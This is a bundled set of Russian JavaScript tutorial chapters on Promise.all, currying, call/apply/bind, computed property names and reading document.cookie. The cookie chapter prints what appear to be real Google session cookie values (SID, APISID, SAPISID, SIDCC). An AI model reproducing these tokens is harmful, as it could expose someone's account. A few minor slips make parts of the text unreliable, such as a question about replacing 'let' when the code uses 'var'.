2002.258056640625ms\n\n~~~\n\n^^Что плохо?^^\n\n^^То, что несвязанные между собой асинхронные процессы выстраиваются в очередь^^\n\n^^Посмотрим на альтернативный вариант^^\n\n~~~js\nfunction getData () {\n  console.time('time')\n  Promise.all([getNames(), getPosts()])\n    .then(result => {\n      console.info(`\\n${ result[0] } | ${ result[1] }\\n\\n`)\n      console.timeEnd('time')\n    })\n}\n~~~\n\n**Результат в консоли**\n\n~~~console\n\nNames | Posts\n\ntime: 1001.474365234375ms\n\n~~~\n\n_________________________________\n\n![ico-25 cap] **Пример 2**\n\n~~~~js\nfunction getData (typ) {\n  return new Promise(function (resolve, reject) {\n    setTimeout(() => {\n      console.log('Promise resolved: ', typ)\n      resolve(typ)\n    }, 1000)\n  })\n}\n\nfunction getAllData () {\n  console.time('Total')\n  const promises = Array.from(arguments).map(x => getData(x))\n  Promise.all(promises)\n    .then(response => {\n      console.timeEnd('Total')\n      console.log('response: ', response)\n    })\n}\n\ngetAllData('figures', 'colors', 'diameters')\n~~~~\n\n^^Функция  **getData()**  возвращает промис^^\n\n^^Промис будет разрешен через 1 сек^^\n\n^^Функция  **getAllData()** формирует  массив промисов  **promises** и запускает сразу все асинхронные процессы с помощью метода  **_Promise.all ()_**^^\n\n^^Что происходит в этом случае:^^\n\n^^Мы не выстраиваем очередь, а запускаем сразу все асинхронные процессы параллельно^^\n\n^^Однако упорядоченность возвращаемых данных контролирует **_Promise.all ()_**^^\n\n^^В возвращаемом массиве данные будут упорядочены в той последовательности, в которой упорядочены промисы в массиве промисов^^\n\n^^В этом случае **_Promise.all ()_** является удобной альтернативой асинхронной функции^^\n\n^^Общая продолжительность операции не будет суммой продолжительности всех асинхронных процессов^^\n\n^^В этом примере вместо 3 секунд, которые выполнялся бы код в случае последовательной обработки запросов, общая продолжительность составила 1 сек^^\n\n_______________________\n[![ico-30 hw] Тесты](quiz/async )\n"},74349:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Каррирование\n\n☼☼☼ функциональщина ☼☼☼\n\n____________________________________________\n\n\n## ![ico-25 icon] Currying\n\nКаррирование (currying) — это процесс преобразования функции, которая принимает несколько аргументов, в последовательность функций, каждая из которых принимает один аргумент.\n\n![ico-25 cap] ** 1**\n\n~~~js\nfunction reminder (arg) {\n  return arguments.length < 5\n    ? reminder.bind(null, ...arguments)\n    : Array.from(arguments)\n}\n~~~\nДля каррирования используется тот же декоратор **bind**, который мы использовали для создания экземпляров функций со статическим контекстом вызова.\nПоэтому первым аргументом по-прежнему передается ссылка на объект, который будет статическим контекстом вызова нового экземпляра функции.\nОднако теперь мы можем передать дополнительные аргументы, которые станут статическими аргументами нового экземпляра функции.\n\n~~~js\nfunction sample () {\n  console.log(Array.from(arguments).toString())\n}\n\nvar alpha = sample.bind(null, \'alpha\')\nvar betta = alpha.bind(null, \'betta\')\nvar delta = betta.bind(null, \'delta\')\n\nalpha(), betta(), delta()\n~~~\n\n~~~console\nalpha\nalpha,betta\nalpha,betta,delta\n~~~\n\nКак видите, мы вызвали функции **_alpha_**, **_betta_** и **_delta_** без аргументов, но каждая функция вывела в консоль содержимое своего объекта **arguments**,\nи это содержимое соотвествует тому, что было передано декоратору **bind** вторым аргументом при создании экземпляра функции.\n\nТ.е. когда создавался экземпляр **_alpha_**, вторым аргументом методу **bind** была передана строка "alpha".\nЭта строка стала статическим первым аргументом функции **_alpha_**.\n\nЕсли мы теперь вызовем функцию **_alpha_** с дополнительными аргументами:\n\n~~~js\nalpha(\'sigma\', \'omega\')\n~~~\n\nто мы увидим в консоли:\n\n~~~console\nalpha,sigma,omega\n~~~\n\nПри создании экземпляра **_betta_** мы применили декоратор **bind** к экземпляру **_alpha_**, у которого уже есть один статический аргумент,\nи мы добавили экземпляру **_betta_** еще один статический аргумент - строку "betta"\nТеперь если вызвать экземпляр **_betta_** с любыми дополнительными аргументами:\n\n~~~js\nbetta(\'figure\', \'smile\')\n~~~\n\nто мы увидим в консоли:\n\n~~~console\nalpha,betta,figure,smile\n~~~\n\nт.е. у экземпляра **_betta_** уже два статических аргумента\n\nну, и так далее...\n\n_______________________________________________________\n\n\n◘◘![ico-25 cap] **11**◘◘\n\n~~~js\nfunction currying (first, second) {\n  return arguments.length === 0\n    ? null\n    : arguments.length === 1\n      ? function (second) {\n          return arguments.length === 1\n            ? [first, second]\n            : null\n        }\n      : [first, second]\n}\n\nvar curried = currying(\'Google\')\n\nconsole.log(curried)\n~~~\n\nПри вызове функции **_currying_** ей был передан всего 1 аргумент - строка "Google",\nпоэтому она вернула новый экземпляр функции со статическим аргументом "Google",\nссылку на который мы поместили в переменную **_curried_**\n\n**Результат в консоли:**\n\n~~~console\nƒ ( second ) {\n    return arguments.length === 1 ?\n        [ first, second ] : null\n}\n~~~\n\nЕсли вызвать новый экземпляр **_curried_** без аргументов, то она вернет ~null~:\n\n~~~js\ncurried()  // null\n~~~\n\nЕсли же при вызове экземпляра **_curried_** мы передадим ей недостающий второй аргумент, например, строку "Mozilla", то в консоль будут выведены оба аргумента:\n\n~~~js\ncurried(\'Mozilla\')   // ► (2) ["Google", "Mozilla"]\n~~~\n\n____________________\n\nВоспользуемся приемом **_Currying_** для создания функций с заданным контекстом и фиксированным значением первого аргумента\n\n◘◘![ico-25 cap] **12**◘◘\n\n~~~js\nvar test = function (args) {\n  return Array.from(args).toString()\n}\n\nfunction func () {\n  console.log (`Функция func вызвана в контексте объекта ${this.name} c аргументами ${this.test( arguments )}`)\n}\n\nvar figure = { name: \'figure\', test: test }\n\nvar circleFunc = func.bind(figure, \'circle\')\nvar rectFunc = func.bind(figure, \'rect\')\nvar lineFunc = func.bind(figure, \'line\')\n\ncircleFunc(100, 120, 80)\nrectFunc(50, 50, 150, 150)\nlineFunc(20, 30, 200, 200)\n~~~\n\n**Результат в консоли:**\n\n~~~console\nФункция func вызвана в контексте объекта figure\n     c аргументами circle,100,120,80\nФункция func вызвана в контексте объекта figure\n     c аргументами rect,50,50,150,150\nФункция func вызвана в контексте объекта figure\n     c аргументами line,20,30,200,200\n~~~\n\n_____________________________\n\n◘◘![ico-25 cap] **13**◘◘\n\n~~~js\nfunction sample (first, second, third) {\n  function test (arg) {\n    return Array.from(arguments)\n  }\n  return [\n    test.bind(null, first),\n    test.bind(null, first, second),\n    test.bind(null, first, second, third)\n  ]\n}\n\nvar test = sample(\'Google\', \'Mozilla\', \'Safari\')\n\nconsole.log(test[0](\'IE\'))\nconsole.log(test[1](\'IE\'))\nconsole.log(test[2](\'IE\'))\n~~~\n\n**Результат в консоли:**\n\n~~~console\n► (2) ["Google", "IE"]\n► (3) ["Google", "Mozilla", "IE"]\n► (4) ["Google", "Mozilla", "Safari", "IE"]\n~~~\n\n_____________________________________\n\n◘◘![ico-25 cap] **14**◘◘\n\n~~~js\nfunction sample (first, second, third) {\n  function test (arg) {\n    return Array.from(arguments)\n  }\n  var one = test.bind(null, first)\n  var two = one.bind(null, second)\n  var three = two.bind(null, third)\n  return [one, two, three]\n}\n\nvar test = sample(\'Google\', \'Mozilla\', \'Safari\')\n\nfor (var num of [0, 1, 2]) console.log(test[num](\'IE\'))\n~~~\n\n**Результат в консоли:**\n\n~~~console\n► (2) ["Google", "IE"]\n► (3) ["Google", "Mozilla", "IE"]\n► (4) ["Google", "Mozilla", "Safari", "IE"]\n~~~\n\n\n_____________________________________\n\n◘◘![ico-25 cap] **15**◘◘\n\n~~~js\nfunction func () {\n  if (!arguments.length) return func.bind(null, 1)\n  console.log(arguments[0])\n  return func.bind(null, arguments[0] * 2)\n}\n\n// func()()()()()()()()()()()\n(eval(`func${\'()\'.repeat(11)}`))\n~~~\n\n**Результат в консоли:**\n\n~~~console\n1\n2\n4\n8\n16\n32\n64\n128\n256\n512\n~~~\n\n_____________________________________\n\n◘◘![ico-25 cap] **16**◘◘\n\n~~~js\nfunction func () {\n  if (!arguments.length) {\n    func.log = []\n    return func.bind(func, 1)\n  }\n  console.log(this.log)\n  this.log.push(arguments[0])\n  return this.bind(this, arguments[0] * 2)\n}\n\nfunc()()()()()()()()()()()\n~~~\n\n~~~console\n► []\n► [1]\n► (2) [1, 2]\n► (3) [1, 2, 4]\n► (4) [1, 2, 4, 8]\n► (5) [1, 2, 4, 8, 16]\n► (6) [1, 2, 4, 8, 16, 32]\n► (7) [1, 2, 4, 8, 16, 32, 64]\n► (8) [1, 2, 4, 8, 16, 32, 64, 128]\n► (9) [1, 2, 4, 8, 16, 32, 64, 128, 256]\n~~~\n\n_____________________________________\n\n◘◘![ico-25 cap] **17**◘◘\n\n\n~~~js\nfunction test () {\n  return Object.assign(this.bind(this, arguments[0] * 2), {\n    result: arguments[0] * 2\n  })\n}\n\ntest = test.bind(test, 1)\n\n\nconsole.log(test ()()()()()().result)  // 64\n~~~\n_________________________________________\n\n## ![ico-25 smile] Тест на вынос мозга\n\n![ico-20 question] Что произойдет в результате запуска кода:\n\n~~~js\nvar sample = function () {\n  this.getSelf()\n}\n\nsample.getSelf = sample.bind(sample)\n\nsample = sample.getSelf\n\nsample()\n~~~\n\n_________________________\n\n[![ico-30 hw] Тесты](quiz/call-apply-bind)\n'},41655:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Изменение контекста\n\n____________________________________________\n\n## ![ico-25 icon] Конструктор Function\n\nФункции можно создавать путем явного вызова конструктора **Function** с ключевым словом **_~new~_**\n\n![ico-20 warn] Однако следует помнить, что созданные таким образом функции будут анонимными\n( \"_anonymous_\" )\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nvar func = new Function('x', 'y', `\n  console.log(x, y)\n  console.log(this)\n  return arguments\n`)\n\nfunc(5, 8, 11, false)\n~~~\n\n^^В результате в консоль будут выведены 5, 8^^\n^^затем - глобальный объект ~window~^^\n^^затем - объект ~arguments~ функции, содержащий 5, 8, 11, ~false~^^\n\n~~~js\nconsole.dir(func)\n~~~\n\n**Результат в консоли:**\n\n~~~console\n▼ ƒ anonymous(x,y,z )\n    arguments: null\n    caller: null\n    length: 3\n    name: \"anonymous\"\n  ► prototype: {constructor: ƒ}\n  ► __proto__: ƒ ()\n~~~\n\n________________________________\n\n## ![ico-25 icon] Наследование\n\nИтак, любая функция в JS является _экземпляром_ класса **Function**\n\nОтсюда следует:\n![ico-20 pin] любая функция является объектом\n![ico-20 pin] все функции наследуют свойства и методы объекта **_prototype_** конструктора **Function**\n\n\n~~~js\nconsole.dir(Function)\n~~~\n\n^^^[Результат в консоли:]\n\n~~~console\n▼ ƒ Function()\n    arguments: (...)\n    caller: (...)\n    length: 1\n    name: \"Function\"\n  ▼ prototype: ƒ ()\n      ► apply: ƒ apply()\n        arguments: (...)\n      ► bind: ƒ bind()\n      ► call: ƒ call()\n        caller: (...)\n      ► constructor: ƒ Function()\n        length: 0\n        name: \"\"\n      ► toString: ƒ toString()\n      ► Symbol(Symbol.hasInstance): ƒ [Symbol.hasInstance]()\n      ► get arguments: ƒ ()\n      ► set arguments: ƒ ()\n      ► get caller: ƒ ()\n      ► set caller: ƒ ()\n      ► __proto__: Object\n  ► __proto__: ƒ ()\n~~~\n\n^^^\n\n![ico-20 warn] Свойство **~&#95;&#95;proto&#95;&#95;~** любой функции является ссылкой на свойство **_prototype_** конструктора **Function**\n\n~~~js\nfunction func () {\n  console.dir(this)\n}\n\nconsole.dir(func)\n~~~\n\n^^^[Результат в консоли:]\n\n~~~console\n▼ ƒ func()\n    arguments: null\n    caller: null\n    length: 0\n    name: \"func\"\n  ► prototype: {constructor: ƒ}\n  ▼ __proto__: ƒ ()\n      ► apply: ƒ apply()\n        arguments: (...)\n      ► bind: ƒ bind()\n      ► call: ƒ call()\n        caller: (...)\n      ► constructor: ƒ Function()\n        length: 0\n        name: \"\"\n      ► toString: ƒ toString()\n      ► Symbol(Symbol.hasInstance): ƒ [Symbol.hasInstance]()\n      ► get arguments: ƒ ()\n      ► set arguments: ƒ ()\n      ► get caller: ƒ ()\n      ► set caller: ƒ ()\n      ► __proto__: Object\n~~~\n\n^^^\n\n![ico-20 pin] Поскольку конструктор **Function** также является функцией, его свойство **_~__proto__~_** тоже является ссылкой на собственное свойство **_~prototype~_**\n\n_________________________________\n\nФункция в JS:\n\n![ico-20 pin] всегда является методом (т.е. свойством какого-либо объекта)\n![ico-20 pin] всегда вызывается в контексте какого-либо объекта\n\n^^Покажем, что функции, объявленные в глобальной области видимости, по умолчанию являются свойствами глобального объекта ~window~^^\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nfunction sample () {\n  console.info('I\\'m sample')\n}\n\nfunction figure () {\n  console.info('I\\'m figure')\n}\n\nvar funcs = ['sample', 'figure']\n\nfor (var func of funcs) {\n  window[func]()\n}\n~~~\n\n^^Все функции, имена которых перечислены в массиве **_funcs_**, будут вызваны и в консоль будет выведено^^\n\n~~~console\nI'm sample\nI'm figure\n~~~\n\n____________________________________\n\n## ![ico-25 icon] Контекст вызова\n\n@@@@\n![](images/funcs-call-girls-ukr.png)\n\nКак мы уже знаем, каждая функция в момент вызова получает ссылку на контекст вызова **_~this~_**.<br><br>Если контекст не указан явно при вызове, то по умолчанию подразумевается глобальный объект (~window~).\n@@@@\n\nЯвное указание контекста вызова происходит при обращении к методам какого-либо объекта:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nvar obj = {\n  name: 'google',\n  say: function () {\n    console.log(this.name)\n  }\n}\nobj.say()   // google\n~~~\n\n^^Здесь перед именем метода **_say()_** явным образом указан контекст вызова **obj**,^^\n^^поэтому _**~this~**_ внутри метода **_say()_** является ссылкой на **obj**^^\n\n~~~js\nwindow.name = 'window'\n\nfunction say () {\n  console.log(this.name)\n}\n\nvar obj = {\n  name: 'google',\n  say: say\n}\n\nsay()       // window\nobj.say()   // google\n~~~\n\n_____________________________________________\n\nРазберитесь самостоятельно с контекстом вызова метода ~getName~ функции ~getName~:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nfunction getName () {\n  console.log(this.name)\n}\n\ngetName.getName = getName\n\ngetName.getName()\n~~~\n_____________________________________________\n\n## ![ico-25 icon] Изменение контекста\n\nЗаглянув в свойство **_~prototype~_** конструктора **Function** или в свойство **_~&#95;&#95;proto&#95;&#95;~_** экземпляра функции,\nможно обнаружить три метода, которые наследуют все функции от своего создателя:\n\n![ico-20 green-ok] **~apply()~**\n![ico-20 green-ok] **~call()~**\n![ico-20 green-ok] **~bind()~**\n\nЭти методы обеспечивают возможность гибко манипулировать контекстом вызова функции\n\nМетоды **~apply~** и **~call~** позволяют одноразово вызвать функцию в заданном контексте\n\nОни отличаются только способом передачи аргументов\n\nМетод **~bind~** создает новый экземпляр функции с жестко установленным контекстом вызова, который невозможно изменить или \"потерять\"\n\nКроме этого, **~bind~** позволяет так же жестко привязать аргументы к новому экземпляру: фактически, указанные аргументы станут постоянными для нового экземпляра функции\n\n### ![ico-20 icon] call()\n\nПервым обязательным аргументом метода является ссылка на объект, в контексте которого будет вызвана функция\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nwindow.name = 'window'\n\nfunction func () {\n  console.log(this.name)\n}\n\nvar figure = {\n  name: 'figure'\n}\n\nvar sample = {\n  name: 'sample'\n}\n\nfunc()               // window\nfunc.call(figure)    // figure\nfunc.call(sample)    // sample\n~~~\n\nДалее может следовать перечень аргументов:\n\n~~~js\nfunction func () {\n  console.log(this.name, arguments)\n}\n\nvar figure = { name: 'figure' }\nvar sample = { name: 'sample' }\n\nfunc.call(figure, 9, false, 'Hello')\nfunc.call(sample, 5, 1, 'Bye')\n~~~\n\n**Результат в консоли:**\n\n••figure ► Arguments(3) [ 9, false, \"Hello\", callee: ƒ, Symbol(Symbol.iterator): ƒ ]••\n••sample ► Arguments(3) [ 5, 1, \"Bye\", callee: ƒ, Symbol(Symbol.iterator): ƒ ]••\n\n\n________________________________________\n\n### ![ico-20 icon] apply()\n\nМетод **_apply()_** отличается от метода **_call()_** только способом передачи аргументов - теперь их нужно передавать массивом:\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~js\nfunction func () {\n  console.log(this.name, arguments)\n}\n\nvar figure = { name: 'figure' }\nvar sample = { name: 'sample' }\n\nfunc.apply(figure, [9, false, 'Hello'])\nfunc.apply(sample, [5, 1, 'Bye'])\n~~~\n\n**Результат в консоли:**\n\n~~~console\nfigure ► Arguments(3) [ 9, false, \"Hello\", callee: ƒ, Symbol(Symbol.iterator): ƒ ]\nsample ► Arguments(3) [ 5, 1, \"Bye\", callee: ƒ, Symbol(Symbol.iterator): ƒ ]\n~~~\n\n__________________________________________________\n\n\nПередача массива аргументов вместо перечня их значений обеспечивает определенную гибкость,\nпоскольку массивы передаются по ссылке, и содержимое массива может динамически обновляться от вызова к вызову\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nvar args = [0]\n\nvar test = (function () {\n  var counter = 0\n  return function () {\n    args.push(this.name)\n    args[0] = ++counter\n  }\n})()\n\nfunction func () {\n  this.test()\n  var args = Array.from(arguments)\n  console.warn(`Who was called before ${this.name} (${args.splice(0, 1)}):`)\n  for (var x of args) console.info(x)\n}\n\nvar objects = [\n  { name: 'figure', test },\n  { name: 'sample', test },\n  { name: 'google', test }\n]\n\nobjects.forEach(obj => func.apply(obj, args))\n~~~\n\n**Результат в консоли:**\n\n••![ico-20 warn] ► Who was called before figure (0):••\n••![ico-20 warn] ► Who was called before sample (1):••\n••figure••\n••![ico-20 warn] ► Who was called before google (2):••\n••figure••\n••sample••\n\n_____________________________\n\n^^Вызовы функции **_func_** логируются в массиве **args**^^\n^^При каждом вызове функция **_func_** получает в аргументах полный отчет о том, сколько раз она была вызвана до этого, и с каким контекстом^^\n^^Поменяйте местами вызовы функций, или добавьте повторный вызов любой из функций, и посмотрите результат^^\n\n______________________________________________________________________________\n\n### ![ico-20 icon] bind()\n\nПо сути, метод **~bind~** является декоратором, поскольку он создает обертку для исходной функции\n\nФункция-wrapper, в которую \"заворачивается\" исходная функция, вызывает ее в нужном контексте:\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nfunction bindContext (func, context, args) {\n  func.call(context, args)\n}\n\nfunction sample ( message ) {\n  console.log(`${this.name}: ${message}`)\n}\n\nvar user = { name: 'Фигаро' }\n\nbindContext(sample, user, 'Hello')\n~~~\n\nЧтобы функция-wrapper возвращала новый экземпляр, немного изменим код,\nа так же обеспечим возможность привязки не только контекста вызова,\nно и аргументов ( этот прием программирования называется **_Currying_**, или каррирование ):\n\n~~~js\nfunction bindContext (func, context, props) {\n  return function (args) {\n    props ? func.call(context, props, args) : func.call(context, args)\n  }\n}\n\nfunction sample (message) {\n  console.log(`${this.name}: ${message}`)\n}\n\nvar user = { name: 'Фигаро' }\n\nvar userSayHello = bindContext(sample, user, 'Hello')\n\nvar userSay = bindContext(sample, user)\n\nuserSayHello()     // Фигаро: Hello\nuserSay('Bye')  // Фигаро: Bye\n~~~\n\nВот и весь механизм работы метода **~bind~**\n\n____________________________\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nvar test = (function () {\n  var counter = 0\n  return function () {\n    return ++counter\n  }\n})()\n\nfunction func () {\n  console.warn(`Функция func вызвана ${this.test()} раз в контексте объекта ${this.name}`)\n}\n\nvar objects = [\n  { name: 'figure', test: test },\n  { name: 'sample', test: test },\n  { name: 'google', test: test }\n]\n\nvar funcs = objects.map(obj => func.bind(obj))\n\nfuncs[0]()\nfuncs[1]()\nfuncs[2]()\n~~~\n\n**Результат в консоли:**\n\n••![ico-20 warn] ► Функция func вызвана 1 раз в контексте объекта figure••\n••![ico-20 warn] ► Функция func вызвана 2 раз в контексте объекта sample••\n••![ico-20 warn] ► Функция func вызвана 3 раз в контексте объекта google••\n\n_____________________________\n\n^^Теперь контекст вызова экземпляров **_figureFunc()_**, **_sampleFunc()_** и **_googleFunc()_** изменить невозможно,\nи при вызове этих функций не нужно явно указывать, в каком контексте они вызываются^^\n\n____________________________________\n\nДобавим еще один объект **bloom** с методами **_figure()_**, **_sample()_** и **_google()_**:\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\nvar bloom = { name: 'bloom' }\nbloom.figure = funcs[0]\nbloom.sample = funcs[1]\nbloom.google = funcs[2]\n\nbloom.figure()\nbloom.sample()\nbloom.google()\n~~~\n\n**Результат в консоли:**\n\n••![ico-20 warn] ► Функция func вызвана 4 раз в контексте объекта figure••\n••![ico-20 warn] ► Функция func вызвана 5 раз в контексте объекта sample••\n••![ico-20 warn] ► Функция func вызвана 6 раз в контексте объекта google••\n\n_______________________________\n\nНесмотря на явное указание контекста при вызове методов:\n\n~~~js\nbloom.figure()\nbloom.sample()\nbloom.google()\n~~~\n\nони отрабатывают в том контексте, который мы им \"прибиндили\" до этого\n\"Прибиндить\" можно не только контекст вызова, но также и аргументы\n\n\n_________________________________________\n\n## ![ico-25 smile] Тест на вынос мозга\n\n![ico-20 question] Что произойдет в результате запуска кода:\n\n~~~js\nvar sample = function () {\n  this.getSelf()\n}\n\nsample.getSelf = sample.bind(sample)\n\nsample = sample.getSelf\n\nsample()\n~~~\n\n_________________________\n\n[![ico-30 hw] Тесты](quiz/call-apply-bind)\n"},88434:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Вычисляемые имена свойств\n\n**ES6**\n\n________________________________________________\n\n![ico-25 warn] В качестве имени свойства можно использовать выражение:\n\n![ico-25 cap] **Пример 1**\n\n~~~js\nvar bag = {\n  ['prop' + 1]: '👜',\n  ['prop' + 2]:  '🍄',\n  ['prop' + 3]:  '🎓',\n}\nconsole.log(bag.prop1)  // 👜\nconsole.log(bag.prop2)  // 🍄\nconsole.log(bag.prop3)  // 🎓\n~~~\n\n__________________________________________\n\n![ico-25 cap] **Пример 2**\n\n~~~js\nvar prop = 'prop'\nvar id = '____'\nvar num = [1, 2, 3]\nvar bag = {\n  [prop + id + num[0]]: '👜',\n  [prop + id + num[1]]:  '🍄',\n  [prop + id + num[2]]:  '🎓',\n}\nconsole.log(bag.prop____1)  // 👜\nconsole.log(bag.prop____2)  // 🍄\nconsole.log(bag.prop____3)  // 🎓\n~~~\n\n__________________________________________\n\n![ico-25 cap] **Пример 3**\n\n~~~js\nvar prop = ['smile', 'clock', 'book']\nvar bag = {\n  [`____${prop[0]}`]: '😉',\n  [`____${prop[1]}`]:  '⏰',\n  [`____${prop[2]}`]:  '📖',\n}\nconsole.log(bag.____smile)  // 😉\nconsole.log(bag.____clock)  // ⏰\nconsole.log(bag.____book)   // 📖\n~~~\n\n__________________________________________\n\n![ico-25 cap] **Пример 4**\n\n~~~js\nvar sample = {}\nvar props = [\n  { prop: 'mouse', val: '🐭' },\n  { prop: 'monkey', val: '🐒' },\n  { prop: 'chicken', val: '🐥' }\n]\nfor (var item of props) {\n  sample[item.prop] = item.val\n}\nconsole.log(sample.mouse)\nconsole.log(sample.monkey)\nconsole.log(sample.chicken)\n~~~\n\n__________________________________________\n\n![ico-25 cap] **Пример 5**\n\n~~~js\nvar things = [\n  { name: 'Rose', val: '🌹' },\n  { name: 'Flower', val: '🌸' },\n  { name: 'Mashroom', val: '🍄' }\n]\nvar bag = {\n  name: '👜',\n  putContent: (function (things) {\n    return function () {\n      for (var item of things) {\n        this[`get${item.name}`] = function () {\n          return item.val\n        }\n      }\n      delete this.putContent\n    }\n  })(things)\n}\n\nconsole.log(bag)\nbag.putContent()\nconsole.log(bag)\nconsole.log(bag.getRose())\nconsole.log(bag.getFlower())\nconsole.log(bag.getMashroom())\n~~~\n\n**Результат**\n\n~~~console\n\n► {name: \"👜\", putContent: ƒ}\n► {name: \"👜\", getRose: ƒ, getFlower: ƒ, getMashroom: ƒ}\n🌹\n🌸\n🍄\n~~~\n\n![ico-25 question] Почему в цикле **~let item~** нельзя заменить на **~var item~** ?\n"},2676:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Данные на клиенте\n\n_______________________________________\n\n## ![ico-25 icon] Cookie\n\nФайлы cookie позволяют идентифицировать уникальных пользователей в разных сеансах,\n\n![ico-20 warn] но не при смене браузеров или устройств\n\nОткройте в браузере любую веб-страницу, которая сохраняет куки на клиенте и которой разрешено это делать на вашем компе\n\n(![ico-20 warn] Chrome игнорирует файлы ~cookie~ с локальных страниц)\n\nЗапустите в консоли следующий (\"многословный\") код:\n\n![ico-25 cap] ** 1**\n\n~~~js\nconsole.info(location.href)\n\nvar res = document.cookie\n  .split('; ')\n  .map(x => {\n    var tmp = x.split('=')\n    var elem = {}\n    elem[tmp[0]] = tmp[1]\n    return elem\n})\nconsole.log(res)\n~~~\n\n![](illustrations/cookie-01.png)\n\nВы получите массив объектов, свойства которых являются записями в ~cookie~-файле данного сайта\n\nИтак, свойство ~document.cookie~ возвращает  строку\n\nВ этой строке можно выделить отдельные \"записи\", отделяемые друг от друга точкой с запятой и пробелом (\"; \")\n\nКаждая \"запись\" представляет собой подстроку вида  xxx=yyy,   где:\n\n~xxx - идентификатор~\n~yyy - значение~\n\nВ нашем примере метод ~document.cookie~  вернул строку:\n\n~~~console\n\"APISID=159NndNJXgdvkeuR/AxzpbVBc2wIvRUKUY; SAPISID=IdbwT_IAY_sf2LU0/AW3V_D0PbOcE6M2Nw; __Secure-1PAPISID=IdbwT_IAY_sf2LU0/AW3V_D0PbOcE6M2Nw; __Secure-3PAPISID=IdbwT_IAY_sf2LU0/AW3V_D0PbOcE6M2Nw; SEARCH_SAMESITE=CgQIn5oB; _ga=GA1.1.1904075603.1709622825; SID=g.a000jwgMbBimGB5upYRX-Kfm5BTyAo30M9TafWQ9KJtyvQS8ZE6TraDNspBgaJxj5VeOfXQf_AACgYKAVASAQASFQHGX2MiqbKoB4jjXV_qJznlPC98jRoVAUF8yKo48nGZIgpwi8HEi7bCtzzH0076; _ga_XPW1QSKFW4=GS1.1.1716438502.20.1.1716438502.0.0.0; 1P_JAR=2024-05-23-09; SIDCC=AKEyXzU3YGRF1qmDi2w50N930i66W0XgsD5El6v-2fWjVqS2NaZoO65pijuA_pz80Hjq6IpLzIc\"\n~~~\n\nв этой строке мы видим подстроки, разделенные \"; \"\n\n~~~console\nAPISID=159NndNJXgdvkeuR/AxzpbVBc2wIvRUKUY\nSAPISID=IdbwT_IAY_sf2LU0/AW3V_D0PbOcE6M2Nw\n__Secure-1PAPISID=IdbwT_IAY_sf2LU0/AW3V_D0PbOcE6M2Nw\n__Secure-3PAPISID=IdbwT_IAY_sf2LU0/AW3V_D0PbOcE6M2Nw\nSEARCH_SAMESITE=CgQIn5oB\n_ga=GA1.1.1904075603.1709622825\nSID=g.a000jwgMbBimGB5upYRX-Kfm5BTyAo30M9TafWQ9KJtyvQS8ZE6TraDNspBgaJxj5VeOfXQf_AACgYKAVASAQASFQHGX2MiqbKoB4jjXV_qJznlPC98jRoVAUF8yKo48nGZIgpwi8HEi7bCtzzH0076\n_ga_XPW1QSKFW4=GS1.1.1716438502.20.1.1716438502.0.0.0\n1P_JAR=2024-05-23-09\nSIDCC=AKEyXzU3YGRF1qmDi2w50N930i66W0XgsD5El6v-2fWjVqS2NaZoO65pijuA_pz80Hjq6IpLzIc\n~~~\n\nВ первой подстроке APISID=159NndNJXgdvkeuR/AxzpbVBc2wIvRUKUY\n\n~ключ:      APISID~\n~значение:  159NndNJXgdvkeuR/AxzpbVBc2wIvRUKUY~\n\nВо второй подстроке SAPISID=IdbwT_IAY_sf2LU0/AW3V_D0PbOcE6M2Nw\n\n~ключ:      SAPISID~\n~значение:  IdbwT_IAY_sf2LU0/AW3V_D0PbOcE6M2Nw~\n\nи т.д.\n\n____________________________\n\n![ico-25 cap] ** 2**\n\nТеперь изменим наш код (и можно перейти на другую страницу):\n\n~~~js\nconsole.info(location.href)\n\ndocument.cookie = 'userName=Ирина'\n\nvar res = document.cookie\n  .split('; ')\n  .map(x => Object.assign({}, { [x.split('=')[0]] : x.split('=')[1] }))\n\nconsole.log(res)\n~~~\n\n![](illustrations/cookie-02.png)\n\nВ результате выполнения кода\n\n~~~js\ndocument.cookie = \"userName=Irina\"\n~~~\n\nв текущий файл cookie была добавлена запись\n\nВсего в  cookie-файле  может храниться до 300 записей\n\nРазмер каждой записи не должен превышать 4Кбайт\n\nДля одного домена может быть записано не более 20 файлов cookie\n\n_____________________________\n\n![ico-25 cap] ** 3**\n\nМожно и так:\n\n~~~js\nvar res = document.cookie\n  .split('; ')\n  .map(x => Object.assign({}, (arr => ({ [arr[0]] : arr[1] }))(x.split('='))))\n~~~\n\nПо пунктам:\n\n~~~js\narr => ({ [arr[0]] : arr[1] })\n~~~\n\nэто анонимная функция, которая на входе получает массив **arr** и возвращает объект с одним свойством\n\n~~~js\n{ [arr[0]] : arr[1] }\n~~~\n\nимя свойства находится в первом элементе массива (arr[0]),\nа значение - во втором элементе массива (arr[1])\n\nЭта анонимная функция используется в функциональном выражении, которое является вторым аргументом метода ~Object.assign~\n(первый аргумент - пустой массив ),\nпричем функциональное выражение \"запускается на месте\" с аргументом  ~x.split('=')~\n\n~~~js\nObject.assign({}, (arr => ({ [arr[0]] : arr[1] }))(x.split('=')))\n~~~\n\nВся эта конструкция вызывается в методе ~map~\n\n_________________________________\n\n![ico-25 cap] ** 4**\n\nОткроем пустое окно с помощью команды ~window.open()~\n\nВ консоль нового окна вставим код:\n\n~~~js\nfunction getCookies () {\n  return document.cookie\n    .split('; ')\n    .map(x => Object.assign({}, (arr => ({ [arr[0]] : arr[1] }))(x.split('='))))\n    .reduce((res, item) => Object.assign(res, item), {})\n}\n~~~\n\nЭта функция будет возвращать куки как объект\n\n![](illustrations/cookie-03.png)\n\n___________________________________\n\n### ![ico-20 icon] Опция expires\n\nПри добавлении записей в 